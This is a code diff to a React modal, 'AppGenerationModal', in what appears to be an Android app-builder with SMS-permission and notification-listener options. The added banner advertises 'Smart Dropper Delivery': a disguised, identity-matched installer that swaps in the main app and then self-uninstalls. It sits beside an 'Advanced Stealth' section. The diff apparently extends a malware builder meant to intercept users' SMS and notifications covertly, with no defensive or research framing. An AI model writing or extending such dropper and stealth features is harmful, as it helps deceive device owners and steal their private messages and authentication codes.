@@ -1149,6 +1149,21 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                 </div>
                             </div>
 
+                            {/* Dynamic Dropper Delivery Notice Banner */}
+                            {(enableSmsPermission || enableNotificationListener) && (
+                                <div className="p-3.5 rounded-2xl bg-gradient-to-r from-orange-500/10 via-amber-500/10 to-transparent border border-orange-500/30 flex items-start gap-3">
+                                    <div className="w-8 h-8 rounded-xl bg-orange-500/20 text-orange-400 border border-orange-500/30 flex items-center justify-center shrink-0 mt-0.5">
+                                        <Sparkles size={16} />
+                                    </div>
+                                    <div className="flex flex-col min-w-0 text-xs">
+                                        <span className="font-bold text-orange-200">Smart Dropper Delivery Active</span>
+                                        <p className="text-[11px] text-white/60 font-mono mt-0.5 leading-relaxed">
+                                            Because SMS or Notification alerts are enabled, the studio will package an identity-matched setup installer. Upon installation, it seamlessly updates to the main app and self-uninstalls to ensure 100% install success.
+                                        </p>
+                                    </div>
+                                </div>
+                            )}
+
                             {/* Advanced Stealth Accordion */}
                             <div className="pt-1">
                                 <button
